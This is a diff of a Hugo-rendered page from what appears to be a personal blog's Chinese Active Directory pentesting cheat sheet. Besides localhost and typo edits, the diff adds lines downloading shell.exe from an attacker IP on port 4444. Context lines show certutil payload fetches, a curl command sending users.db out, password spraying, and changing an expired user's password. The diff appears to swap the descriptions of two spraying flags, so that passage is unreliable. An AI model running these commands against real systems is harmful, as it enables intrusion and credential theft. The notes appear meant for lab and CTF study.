@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
-    <head><meta charset='utf-8'>
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
 <title>血缇之书</title>
 
-<link rel='canonical' href='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
+<link rel='canonical' href='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 
 <link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="血缇之书">
 <meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
-<meta property='og:url' content='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
+<meta property='og:url' content='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-08-23T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-08-23T19:40:56&#43;08:00'/>
 <meta name="twitter:title" content="血缇之书">
@@ -247,7 +247,7 @@
         <li><a href="#查看保存凭证">查看保存凭证</a></li>
         <li><a href="#powershell历史记录">powershell历史记录</a></li>
         <li><a href="#查spn需要管理权限">查spn（需要管理权限）</a></li>
-        <li><a href="#acl及用户属性详细枚举">acl及用户属性详细枚举</a></li>
+        <li><a href="#acl或者用户属性详细枚举">acl或者用户属性详细枚举</a></li>
         <li><a href="#枚举本机可写目录">枚举本机可写目录</a></li>
         <li><a href="#委派">委派</a></li>
         <li><a href="#无约束委派">无约束委派</a></li>
@@ -356,6 +356,7 @@
   </ul>
 
   <ul>
+    <li><a href="#密码过期用户更改密码">密码过期用户更改密码</a></li>
     <li><a href="#ntlm_thefthash回调窃取_hash钓鱼">ntlm_theft——hash回调窃取_hash钓鱼</a></li>
     <li><a href="#laps密码读取">laps密码读取</a></li>
     <li><a href="#windows本地提权路径查询">windows本地提权路径查询</a>
@@ -805,7 +806,7 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -H <span style="color:#e6db74">&#34;</span>$hash<span style="color:#e6db74">&#34;</span> --bloodhound --collection All --dns-server <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span>
 </span></span></code></pre></div><h4 id="rusthound">rusthound
 </h4><p>密码</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>rusthound -d $domain -u $user@$domain -p $pass -f $FPDN -i $ip --fqdn-resolver --adcs -z -o ./
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>rusthound -d $domain -u $user@$domain -p $pass -f $FQDN -i $ip --fqdn-resolver --adcs -z -o ./
 </span></span></code></pre></div><p>kerbores认证</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/tmp/jeor.mormont.ccache&#34;</span>
 </span></span><span style="display:flex;"><span>rusthound -d $domain -u $user@$domain -p $pass -f $FQDN -k -i $ip --fqdn-resolver --adcs -z -o ./ 
@@ -888,7 +889,7 @@
 </span></span></code></pre></div><h3 id="查spn需要管理权限">查spn（需要管理权限）
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADUser -Filter {ServicePrincipalName <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;*&#34;</span>} -Properties ServicePrincipalName |
 </span></span><span style="display:flex;"><span>Select-Object SamAccountName, ServicePrincipalName
-</span></span></code></pre></div><h3 id="acl及用户属性详细枚举">acl及用户属性详细枚举
+</span></span></code></pre></div><h3 id="acl或者用户属性详细枚举">acl或者用户属性详细枚举
 </h3><h4 id="目标可写枚举">目标可写枚举
 </h4><p>bloodyad远程</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodyAD --host $FQDN --dc-ip $ip -d $domain -u $user -p $pass get writable --detail
@@ -970,12 +971,12 @@ powerview</p>
 </h3><p>加上这个参数，否则第一个匹配成功就会结束</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>--continue-on-success
 </span></span><span style="display:flex;"><span>例如
-</span></span><span style="display:flex;"><span>nxc smb $ip -u users -p $pass1 --continue-on-success
+</span></span><span style="display:flex;"><span>nxc smb $ip -u users -p $pass1 --no-bruteforce
 </span></span></code></pre></div><p>加上这个参数，会利用密码和用户名交叉喷洒尝试所有可能</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>--no-bruteforce
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>--continue-on-success
 </span></span></code></pre></div><p>winrm密码喷洒
 nxc</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --continue-on-success
 </span></span></code></pre></div><h3 id="dc存活用户枚举">dc存活用户枚举
 </h3><h4 id="kerbrute爆破">kerbrute爆破
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>kerbrute userenum --dc $ip -d $domain /opt/user.txt
@@ -1524,7 +1525,11 @@ nxc</p>
 </span></span></code></pre></div><p>并且如果这个时候我们需要反弹shell，msf会默认目标处于内网无法回弹，但是如果我们知道目标能访问到我们，我们可以直接使用下面的参数规避报错</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>set ReverseAllowProxy true
 </span></span></code></pre></div><h1 id="提权or横向">提权or横向
-</h1><h2 id="ntlm_thefthash回调窃取_hash钓鱼">ntlm_theft——hash回调窃取_hash钓鱼
+</h1><h2 id="密码过期用户更改密码">密码过期用户更改密码
+</h2><p>可以直接利用changepass.py更改，他调用的是rpcsmc接口允许跳过认证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-changepasswd $domain/$user:<span style="color:#e6db74">&#34;&#34;</span>@$ip -newpass wackMaker1!
+</span></span></code></pre></div><p>提示需要正确密码，如果我们有过期前的密码就填，没有就留空，一样的</p>
+<h2 id="ntlm_thefthash回调窃取_hash钓鱼">ntlm_theft——hash回调窃取_hash钓鱼
 </h2><p>当我们处于内网当中的时候，可以利用此工具生成各种文件用来触发smb认证回调来利用responder截获ntlmv2认证，往往需要配合流量转发使用</p>
 <p>工具地址，注意template也需要下载，最好全部打包</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/Greenwolf/ntlm_theft
@@ -1563,6 +1568,8 @@ nxc</p>
 </span></span></code></pre></div><h3 id="mssql语法">mssql语法
 </h3><h4 id="impacket包连接mssql数据库">impacket包连接mssql数据库
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-mssqlclient $user:$pass@$ip
+</span></span><span style="display:flex;"><span>直接无法认证可以尝试windows认证
+</span></span><span style="display:flex;"><span>impacket-mssqlclient -windows-auth $user:$pass@$ip
 </span></span></code></pre></div><p>如果确认凭据完整但是无法登陆，可以换username为sa尝试以管理员登陆</p>
 <h4 id="落地常用枚举">落地常用枚举
 </h4><p>查询数据库版本</p>
@@ -3393,9 +3400,9 @@ linux换行</p>
 </span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//你的IP/文件路径 保存路径
 </span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">22</span>/LansweeperDecrypt.ps1 C:\windows\tasks\LansweeperDecrypt.ps1
 </span></span><span style="display:flex;"><span>powershell
-</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">2</span>/hr.exe -OutFile <span style="color:#e6db74">&#34;C:\users\alexander.green\Desktop\hr.exe&#34;</span>
+</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4444</span>/shell.exe -OutFile <span style="color:#e6db74">&#34;C:\users\sqlsvc\Documents&#34;</span>
 </span></span><span style="display:flex;"><span>或者
-</span></span><span style="display:flex;"><span>(New-Object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#39;http://10.10.16.221/SharpHound.exe&#39;</span>, <span style="color:#e6db74">&#39;C:\temp\SharpHound.exe&#39;</span>)
+</span></span><span style="display:flex;"><span>(New-Object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#39;http://10.10.16.23:4444/shell.exe&#39;</span>, <span style="color:#e6db74">&#39;C:\users\sqlsvc\Documents\shell.exe&#39;</span>)
 </span></span></code></pre></div><h3 id="通用反向上传脚本uploadspy">通用反向上传脚本（uploads.py）
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#curl -F &#34;file=@/home/app/app/instance/users.db&#34; http://10.10.16.6/</span>
@@ -3761,7 +3768,7 @@ linux换行</p>
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                 
                 >
-            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
 <script>
     (function () {
         const customFont = document.createElement('link');
